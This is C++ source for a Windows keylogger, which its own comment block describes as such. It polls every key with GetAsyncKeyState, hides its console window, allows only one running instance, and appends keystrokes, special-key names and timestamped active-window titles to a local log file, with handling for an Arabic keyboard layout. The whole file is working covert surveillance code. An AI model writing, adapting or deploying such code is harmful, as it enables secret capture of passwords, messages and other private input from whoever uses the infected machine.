#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <fstream>
#include <windows.h>
#include <algorithm> 
#include <string> 
#include <ctime>
#include <sstream>
#include <tlhelp32.h> 


/*
    Purpose:
        This code is designed to create a keylogger application that logs keystrokes and active window titles into a log file. The main functionalities include:
        1. Logging keystrokes and special keys.
        2. Recording the title of the active window whenever it changes.
        3. Logging the date, time, and timezone along with the active window title.
        4. Ensuring that only one instance of the specified process is running.
        5. Hiding the console window.
        6. Handling different keyboard layouts, including Arabic.
        7. Implementing a multi-line comment to explain the main purpose of the code.
        8. Exiting the application when the F1 key is pressed (for testing purposes).

    Functions:
        - SaveInFile(const string& Information): Saves information to a log file.
        - GetActiveWindowTitle(): Retrieves the title of the active window.
        - SpecialKeys(int key): Converts special keys to their corresponding string representations.
        - IsOnlyOneProcessRunning(const char* processName): Checks if only one instance of a process is running.
        - main(): The main function of the program.

    Additional Notes:
        - The code is designed to run continuously in a loop until terminated.
        - Special keys are converted to their descriptive names before being logged.
        - The F1 key is used as an exit trigger for testing purposes.
*/

using namespace std;
string Log_File = "log_file.txt";

void SaveInFile(const string& Information) {
    fstream logFile;
    logFile.open(Log_File, ios::app);
    logFile << Information;
    logFile.close();
}

string currentWindow = "";
string GetActiveWindowTitle() {
    HWND hwnd = GetForegroundWindow();
    if (hwnd != NULL) {
        char windowTitle[256];
        GetWindowText(hwnd, windowTitle, sizeof(windowTitle));
        return string(windowTitle);
    }
    return "";
}

string SpecialKeys(int key) {
    string result;
    switch (key) {
    case VK_SPACE:
        result = " ";
        break;
    case VK_RETURN:
        result = "[RETURN]";
        break;
    case VK_BACK:
        result = "[BACKSPACE]";
        break;
    case VK_TAB:
        result = "[TAB]";
        break;
    case VK_CAPITAL:
        result = "[CAPS LOCK]";
        break;
    case VK_ESCAPE:
        result = "[ESC]";
        break;
    case VK_SHIFT:
        result = "[SHIFT]";
        break;
    case VK_CONTROL:
        result = "[CTRL]";
        break;
    case VK_MENU:
        result = "[ALT]";
        break;
    case VK_LWIN:
    case VK_RWIN:
        result = "[WIN]";
        break;
    case VK_APPS:
        result = "[APPS]";
        break;
    case VK_SNAPSHOT:
        result = "[PRINT SCREEN]";
        break;
    case VK_SCROLL:
        result = "[SCROLL LOCK]";
        break;
    case VK_PAUSE:
        result = "[PAUSE]";
        break;
    case VK_INSERT:
        result = "[INS]";
        break;
    case VK_HOME:
        result = "[HOME]";
        break;
    case VK_PRIOR:
        result = "[PAGE UP]";
        break;
    case VK_DELETE:
        result = "[DEL]";
        break;
    case VK_END:
        result = "[END]";
        break;
    case VK_NEXT:
        result = "[PAGE DOWN]";
        break;
    case VK_LEFT:
        result = "[LEFT]";
        break;
    case VK_UP:
        result = "[UP]";
        break;
    case VK_RIGHT:
        result = "[RIGHT]";
        break;
    case VK_DOWN:
        result = "[DOWN]";
        break;
    case VK_SELECT:
        result = "[SELECT]";
        break;
    case VK_EXECUTE:
        result = "[EXECUTE]";
        break;
    case VK_HELP:
        result = "[HELP]";
        break;
    case VK_SLEEP:
        result = "[SLEEP]";
        break;
    case VK_NUMLOCK:
        result = "[NUM LOCK]";
        break;
    case VK_BROWSER_BACK:
        result = "[BROWSER BACK]";
        break;
    case VK_BROWSER_FORWARD:
        result = "[BROWSER FORWARD]";
        break;
    case VK_BROWSER_REFRESH:
        result = "[BROWSER REFRESH]";
        break;
    case VK_BROWSER_STOP:
        result = "[BROWSER STOP]";
        break;
    case VK_BROWSER_SEARCH:
        result = "[BROWSER SEARCH]";
        break;
    case VK_BROWSER_FAVORITES:
        result = "[BROWSER FAVORITES]";
        break;
    case VK_BROWSER_HOME:
        result = "[BROWSER HOME]";
        break;
    case VK_VOLUME_MUTE:
        result = "[VOLUME MUTE]";
        break;
    case VK_VOLUME_DOWN:
        result = "[VOLUME DOWN]";
        break;
    case VK_VOLUME_UP:
        result = "[VOLUME UP]";
        break;
    case VK_MEDIA_NEXT_TRACK:
        result = "[MEDIA NEXT TRACK]";
        break;
    case VK_MEDIA_PREV_TRACK:
        result = "[MEDIA PREV TRACK]";
        break;
    case VK_MEDIA_STOP:
        result = "[MEDIA STOP]";
        break;
    case VK_MEDIA_PLAY_PAUSE:
        result = "[MEDIA PLAY/PAUSE]";
        break;
    case VK_LAUNCH_MAIL:
        result = "[LAUNCH MAIL]";
        break;
    case VK_LAUNCH_MEDIA_SELECT:
        result = "[LAUNCH MEDIA SELECT]";
        break;
    case VK_LAUNCH_APP1:
        result = "[LAUNCH APP1]";
        break;
    case VK_LAUNCH_APP2:
        result = "[LAUNCH APP2]";
        break;
    case VK_F1:
        result = "[F1]";
        break;
    case VK_F2:
        result = "[F2]";
        break;
    case VK_F3:
        result = "[F3]";
        break;
    case VK_F4:
        result = "[F4]";
        break;
    case VK_F5:
        result = "[F5]";
        break;
    case VK_F6:
        result = "[F6]";
        break;
    case VK_F7:
        result = "[F7]";
        break;
    case VK_F8:
        result = "[F8]";
        break;
    case VK_F9:
        result = "[F9]";
        break;
    case VK_F10:
        result = "[F10]";
        break;
    case VK_F11:
        result = "[F11]";
        break;
    case VK_F12:
        result = "[F12]";
        break;
    default:
        break;
    }
    return result;
}

bool IsOnlyOneProcessRunning(const char* processName) {
    int count = 0;
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(snapshot, &entry) == TRUE) {
        while (Process32Next(snapshot, &entry) == TRUE) {
            if (strcmp(entry.szExeFile, processName) == 0) {
                count++;
                if (count > 1) {
                    CloseHandle(snapshot);
                    return false;
                }
            }
        }
    }

    CloseHandle(snapshot);
    return count == 1;
}

int main() {
    const char* processName = "Project-Elsalakan.exe";

    if (!IsOnlyOneProcessRunning(processName)) {
        return 0;
    }

    int special_Key[] = { VK_MENU, VK_LAUNCH_APP2, VK_LAUNCH_APP1,
        VK_LAUNCH_MEDIA_SELECT, VK_LAUNCH_MAIL,
        VK_MEDIA_PLAY_PAUSE, VK_MEDIA_STOP, VK_MEDIA_PREV_TRACK,
        VK_MEDIA_NEXT_TRACK, VK_VOLUME_MUTE, VK_VOLUME_DOWN,
        VK_VOLUME_UP, VK_BROWSER_HOME, VK_BROWSER_FAVORITES,
        VK_BROWSER_SEARCH, VK_BROWSER_STOP, VK_BROWSER_REFRESH,
        VK_BROWSER_FORWARD, VK_BROWSER_BACK, VK_NUMLOCK, VK_SLEEP,
        VK_HELP, VK_EXECUTE, VK_SELECT, VK_DOWN, VK_RIGHT, VK_UP,
        VK_LEFT, VK_NEXT, VK_END, VK_DELETE, VK_PRIOR, VK_HOME,
        VK_INSERT, VK_PAUSE, VK_SCROLL, VK_SNAPSHOT, VK_APPS,
        VK_RWIN, VK_LWIN, VK_MENU, VK_CONTROL, VK_SHIFT, VK_ESCAPE,
        VK_CAPITAL, VK_TAB, VK_BACK, VK_RETURN, VK_SPACE, VK_F1, VK_F2,
        VK_F3, VK_F4, VK_F5, VK_F6, VK_F7, VK_F8, VK_F9, VK_F10, VK_F11,
        VK_F12 };
    std::string specialK;
    bool isSpecial;
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    while (true) {
        string newWindow = GetActiveWindowTitle();
        if (!newWindow.empty() && newWindow != currentWindow) {
            currentWindow = newWindow;

            // Get the current date and time
            time_t now = time(0);
            tm ltm;

            // Use localtime_s instead of localtime
            localtime_s(&ltm, &now);

            // Format the date and time
            stringstream ss;
            ss << 1900 + ltm.tm_year << "-"
                << 1 + ltm.tm_mon << "-"
                << ltm.tm_mday << " ";

            // Check if it's PM
            if (ltm.tm_hour > 12) {
                ss << ltm.tm_hour - 12 << ":"
                    << ltm.tm_min << ":"
                    << ltm.tm_sec << " PM";
            }
            else if (ltm.tm_hour == 0) {
                ss << ltm.tm_hour + 12<< ":"
                    << ltm.tm_min << ":"
                    << ltm.tm_sec << " AM";
            }
            else {
                ss << ltm.tm_hour << ":"
                    << ltm.tm_min << ":"
                    << ltm.tm_sec << " AM";
            }

            string dateTime = ss.str();

            // Get the current timezone
            _tzset();
            string timezone = _tzname[0];

            // Save the window title, date/time, and timezone in the file
            SaveInFile("\n\n[" + currentWindow + " " + dateTime + " " + timezone + "]\n");
        }
        for (int i = 8; i <= 190; i++) {
            if (GetAsyncKeyState(i) == -32767) {
                isSpecial = std::find(std::begin(special_Key), std::end(special_Key), i) != std::end(special_Key);
                if (isSpecial) {
                    specialK = SpecialKeys(i);
                    SaveInFile(specialK);
                }
                else {
                    HKL keyboardLayout = GetKeyboardLayout(0);
                    WORD languageID = LOWORD(keyboardLayout);
                    if (PRIMARYLANGID(languageID) == LANG_ARABIC) {
                        wchar_t ch;
                        BYTE keyboardState[256];
                        GetKeyState(i);  // Use GetKeyState instead of GetKeyboardState
                        if (ToUnicode(i, MapVirtualKey(i, 0), keyboardState, &ch, 1, 0) == 1) {
                            char mbChar[2];
                            WideCharToMultiByte(CP_UTF8, 0, &ch, 1, mbChar, 2, NULL, NULL);
                            SaveInFile(std::string(mbChar, mbChar + 2));
                        }
                    }
                    else {
                        SaveInFile(std::string(1, static_cast<char>(std::tolower(i))));
                    }
                }
            }
        }

        //remove later ( for testing only )
        if (GetAsyncKeyState(VK_F1))
            exit(0);

    }

    return 0;
}